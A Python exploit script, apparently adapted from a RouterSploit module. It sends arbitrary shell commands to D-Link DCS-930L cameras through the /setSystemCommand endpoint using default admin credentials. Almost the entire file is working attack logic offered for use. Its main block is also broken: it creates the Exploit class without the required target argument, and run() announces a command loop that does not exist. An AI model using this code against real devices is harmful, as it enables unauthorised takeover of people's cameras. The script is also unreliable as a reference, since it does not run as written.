target = ""
# rsf exploit module
# description: Module exploits D-Link DCS-930L Remote Code Execution vulnerability which allows executing command on the device.

import requests

class Exploit:
    __info__ = {
        "name": "D-Link DCS-930L Auth RCE",
        "description": "Module exploits D-Link DCS-930L Remote Code Execution vulnerability which allows executing command on the device.",
        "authors": (
            "Nicholas Starke <nick[at]alephvoid.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/39437/",
        ),
        "devices": (
            "D-Link DCS-930L",
        )
    }

    def __init__(self, target, username="admin", password=""):
        self.target = target
        self.username = username
        self.password = password
        self.port = 80

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = {
            "ReplySuccessPage": "docmd.htm",
            "ReplyErrorPage": "docmd.htm",
            "SystemCommand": cmd,
            "ConfigSystemCommand": "Save"
        }
        response = requests.post(f"{self.target}/setSystemCommand", data=data, auth=(self.username, self.password), headers=headers)
        return response.text

    def check(self):
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = {
            "ReplySuccessPage": "docmd.htm",
            "ReplyErrorPage": "docmd.htm",
            "SystemCommand": "ls",
            "ConfigSystemCommand": "Save"
        }
        response = requests.post(f"{self.target}/setSystemCommand", data=data, auth=(self.username, self.password), headers=headers)
        if response.status_code == 200 and "ConfigSystemCommand" in response.text:
            return True
        return False




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
